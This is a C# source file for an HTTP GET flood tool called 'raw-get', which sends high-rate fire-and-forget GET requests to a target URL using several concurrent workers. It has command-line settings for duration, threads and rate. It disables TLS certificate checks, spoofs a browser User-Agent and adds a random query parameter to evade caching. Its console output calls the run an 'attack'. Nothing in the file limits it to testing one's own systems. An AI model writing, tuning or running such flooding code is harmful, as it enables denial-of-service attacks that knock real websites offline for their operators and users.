// raw-get.cs - Compile with: dotnet build or csc /optimize+ /platform:x64 raw-get.cs
// Usage: raw-get.exe <target> [time] [threads] [rate]

using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

class RawGetFlood
{
    static async Task Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: raw-get.exe <target> [time] [threads] [rate]");
            return;
        }

        string targetUrl = args[0];
        int durationSec = args.Length > 1 ? int.Parse(args[1]) : 60;
        int threads = args.Length > 2 ? int.Parse(args[2]) : 4;
        int ratePerWorker = args.Length > 3 ? int.Parse(args[3]) : 200;

        if (!targetUrl.StartsWith("http"))
            targetUrl = "http://" + targetUrl;

        Uri uri = new Uri(targetUrl);
        bool isHttps = uri.Scheme.Equals("https", StringComparison.OrdinalIgnoreCase);
        int port = uri.Port;

        Console.WriteLine($"\n🔥 RAW-GET (no proxy, low‑mem mode) | Target: {targetUrl}");
        Console.WriteLine($"   Duration: {durationSec}s | Workers: {threads} | Rate: {ratePerWorker} req/s/worker");
        Console.WriteLine($"   Expected total RPS: {threads * ratePerWorker} | RAM usage: ~{threads * 50} MB");

        var cts = new CancellationTokenSource();
        var workerTasks = new Task[threads];
        var perWorkerCounters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < threads; i++)
        {
            int workerId = i;
            perWorkerCounters[workerId] = 0;
            workerTasks[i] = RunWorker(workerId, uri, durationSec, ratePerWorker, cts.Token, perWorkerCounters);
        }

        // Monitor RPS every second
        var monitorTask = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in perWorkerCounters)
                {
                    long count = kv.Value;
                    if (count > 0)
                        Console.WriteLine($"Worker {kv.Key} RPS: {count}");
                    perWorkerCounters[kv.Key] = 0;
                }
            }
        });

        // Stop after duration
        await Task.Delay(durationSec * 1000);
        cts.Cancel();

        await Task.WhenAll(workerTasks);
        await monitorTask;

        Console.WriteLine("\n⏹️ Attack finished, exiting...");
    }

    static async Task RunWorker(int workerId, Uri uri, int durationSec, int ratePerWorker, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Configure HTTP handler with connection limits (similar to Node.js Agent)
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromMinutes(2),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(30),
            MaxConnectionsPerServer = 256,          // per worker limit
            KeepAlivePingDelay = TimeSpan.FromSeconds(10),
            KeepAlivePingTimeout = TimeSpan.FromSeconds(5),
            EnableMultipleHttp2Connections = true,
            UseProxy = false,                       // no proxies
            AutomaticDecompression = DecompressionMethods.None,
            PreAuthenticate = false,
            AllowAutoRedirect = false,
            SslOptions = new System.Net.Security.SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, certificate, chain, errors) => true // rejectUnauthorized: false
            }
        };

        using var client = new HttpClient(handler);
        client.DefaultRequestHeaders.ConnectionClose = false;
        client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml");
        client.DefaultRequestHeaders.Add("Connection", "keep-alive");

        // Build request URI with random query param to bypass cache
        string baseUri = uri.ToString();
        string pathAndQuery = uri.PathAndQuery;
        string querySeparator = pathAndQuery.Contains('?') ? "&" : "?";
        string randomParam = $"{querySeparator}_={Guid.NewGuid():N}";

        var requestUri = baseUri + randomParam;

        int intervalMs = 1000 / ratePerWorker;
        using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(intervalMs));
        var stopwatch = Stopwatch.StartNew();

        while (!ct.IsCancellationRequested && stopwatch.Elapsed.TotalSeconds < durationSec)
        {
            await timer.WaitForNextTickAsync(ct);
            if (ct.IsCancellationRequested)
                break;

            // Fire-and-forget requests (but we count them)
            _ = SendRequestAsync(client, requestUri, workerId, counter, ct);
        }

        // Allow pending requests to finish (brief wait)
        await Task.Delay(500, CancellationToken.None);
    }

    static async Task SendRequestAsync(HttpClient client, string uri, int workerId, ConcurrentDictionary<int, long> counter, CancellationToken ct)
    {
        try
        {
            using var response = await client.GetAsync(uri, HttpCompletionOption.ResponseHeadersRead, ct);
            // Increment counter
            counter.AddOrUpdate(workerId, 1, (_, old) => old + 1);
            // Discard body to free memory
            await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
        }
        catch
        {
            // Ignore errors
        }
    }
}
